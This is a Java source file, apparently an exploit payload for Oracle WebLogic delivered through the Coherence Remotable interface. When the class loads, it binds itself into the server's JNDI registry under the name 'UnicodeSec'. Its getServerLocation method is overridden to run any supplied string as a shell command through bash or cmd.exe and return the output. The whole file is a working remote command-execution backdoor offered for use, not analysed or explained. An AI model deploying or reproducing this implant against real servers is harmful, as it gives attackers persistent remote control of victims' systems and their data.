package org.unicodesec;

import com.tangosol.internal.util.invoke.RemoteConstructor;
import weblogic.cluster.singleton.ClusterMasterRemote;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.List;

public class test implements com.tangosol.internal.util.invoke.Remotable, ClusterMasterRemote {


    static {
        try {
            String bindName = "UnicodeSec";
            Context ctx = new InitialContext();
            test remote = new test();
            ctx.rebind(bindName, remote);
            System.out.println("installed");
        } catch (Exception var1) {
            var1.printStackTrace();
        }
    }

    public test() {

    }

    @Override
    public RemoteConstructor getRemoteConstructor() {
        return null;
    }

    @Override
    public void setRemoteConstructor(RemoteConstructor remoteConstructor) {

    }

    @Override
    public void setServerLocation(String var1, String var2) throws RemoteException {

    }

    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        try {

            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            List<String> cmds = new ArrayList<String>();

            if (isLinux) {
                cmds.add("/bin/bash");
                cmds.add("-c");
                cmds.add(cmd);
            } else {
                cmds.add("cmd.exe");
                cmds.add("/c");
                cmds.add(cmd);
            }

            ProcessBuilder processBuilder = new ProcessBuilder(cmds);
            processBuilder.redirectErrorStream(true);
            Process proc = processBuilder.start();

            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuffer sb = new StringBuffer();

            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }

            return sb.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}

